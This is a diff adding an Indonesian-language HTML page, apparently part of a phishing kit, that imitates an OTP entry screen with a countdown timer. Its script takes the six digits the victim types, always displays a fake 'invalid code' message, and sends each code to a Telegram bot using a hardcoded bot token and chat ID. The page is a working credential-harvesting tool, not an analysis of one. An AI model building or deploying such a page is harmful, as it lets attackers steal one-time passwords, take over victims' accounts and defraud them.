@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="Red">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Input Kode OTP</title>
+  <style>
+    #gambar-atas {
+      margin-bottom: 20px;
+      padding:-180%;
+      margin-top:-8px;
+      left:300px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+      top:20px
+      height:-80px;
+      position:relative;
+    }
+    .input-container {
+      text-align: center;
+    }
+
+    .otp-input {
+      width: 20px;
+      text-align: center;
+      margin: 0 5px;
+      padding: 7px;
+      font-weight: bold;
+      font-size: 13px;
+      border-radius: 25px;
+    }
+
+    .submit-btn {
+      margin-top: 40px;
+      padding: 10px 20px;
+      background-color: #ff0000;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #0056b3;
+    }
+
+    /* Tambahkan gaya untuk elemen lapisan */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5); /* Warna latar semi-transparan */
+      display: none; /* Sembunyikan secara default */
+      justify-content: center;
+      align-items: center;
+      z-index: 999; /* Atur z-index agar muncul di atas konten lain */
+    }
+
+    .notification-text {
+      background-color: #fff; /* Warna latar belakang */
+      padding: 10px 20px; /* Padding */
+      border-radius: 5px; /* Sudut border */
+    }
+
+    .countdown {
+      font-size: 13px;
+      margin-bottom: 10px;
+      margin-left: 38px;
+      font-weight: bold;
+      color: blue;
+    }
+  </style>
+</head>
+<body>
+  <div id="gambar-atas">
+    <img src="https://i.ibb.co/XXYSCxx/Screenshot-20240401-111555-Pixel-Lab.jpg" alt="Gambar Atas">
+  </div>
+
+  <!-- Tambahkan div overlay untuk pemberitahuan -->
+  <div class="overlay" id="overlay">
+    <div class="notification-text" id="notification-text">Kode OTP tidak valid.</div>
+  </div>
+
+  <div class="countdown" id="countdown"></div>
+
+  <div class="input-container">
+    <input type="tel" maxlength="1" class="otp-input" id="digit1" oninput="moveToNext(this)">
+    <input type="tel" maxlength="1" class="otp-input" id="digit2" oninput="moveToNext(this)">
+    <input type="tel" maxlength="1" class="otp-input" id="digit3" oninput="moveToNext(this)">
+    <input type="tel" maxlength="1" class="otp-input" id="digit4" oninput="moveToNext(this)">
+    <input type="tel" maxlength="1" class="otp-input" id="digit5" oninput="moveToNext(this)">
+    <input type="tel" maxlength="1" class="otp-input" id="digit6" oninput="moveToNext(this)">
+    <button class="submit-btn" onclick="submitOTP()">Selanjutnya</button>
+  </div>
+
+  <script>
+    function moveToNext(input) {
+      if (input.value.length >= 1) {
+        var nextInput = input.nextElementSibling;
+        if (nextInput) {
+          nextInput.focus();
+        }
+      }
+    }
+
+    function submitOTP() {
+      // Mengambil nilai OTP
+      var otp = "";
+      for (var i = 1; i <= 6; i++) {
+        var digitInput = document.getElementById("digit" + i);
+        otp += digitInput.value;
+      }
+
+      // Menampilkan pemberitahuan "Kode OTP tidak valid"
+      displayInvalidOTPMessage();
+
+      // Kirim OTP ke bot Telegram
+      sendTelegramMessage(otp);
+    }
+
+    function displayInvalidOTPMessage() {
+      var overlay = document.getElementById('overlay');
+
+      // Tampilkan overlay
+      overlay.style.display = 'flex';
+
+      setTimeout(function() {
+        // Sembunyikan overlay setelah 2 detik
+        overlay.style.display = 'none';
+      }, 2000); // Menampilkan pesan selama 2 detik
+    }
+
+    function sendTelegramMessage(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim ke Telegram: " + message);
+        }
+      };
+
+      var botToken = "6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0"; // Ganti dengan token bot Anda
+      var chatId = "6824078885"; // Ganti dengan ID obrolan Anda
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    let countdownTime = 300;
+
+    // Mendapatkan elemen countdown
+    const countdownElement = document.getElementById('countdown');
+
+    // Mengatur interval countdown setiap 1 detik
+    const countdownInterval = setInterval(function() {
+      // Mengkonversi detik menjadi menit dan detik
+      const minutes = Math.floor(countdownTime / 60);
+      const seconds = countdownTime % 60;
+
+      // Format waktu countdown
+      const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+      // Memperbarui teks countdown pada elemen
+      countdownElement.textContent = `Masukan OTP: ${formattedTime}`;
+
+      // Mengurangi waktu countdown
+      countdownTime--;
+
+      // Saat countdown selesai
+      if (countdownTime < 0) {
+        clearInterval(countdownInterval);
+        countdownElement.textContent = 'Waktu habis';
+      }
+    }, 1000);
+
+    // Memanggil fungsi startCountdown saat halaman dimuat
+    window.onload = function() {
+      startCountdown();
+    };
+  </script>
+</body>
+</html>
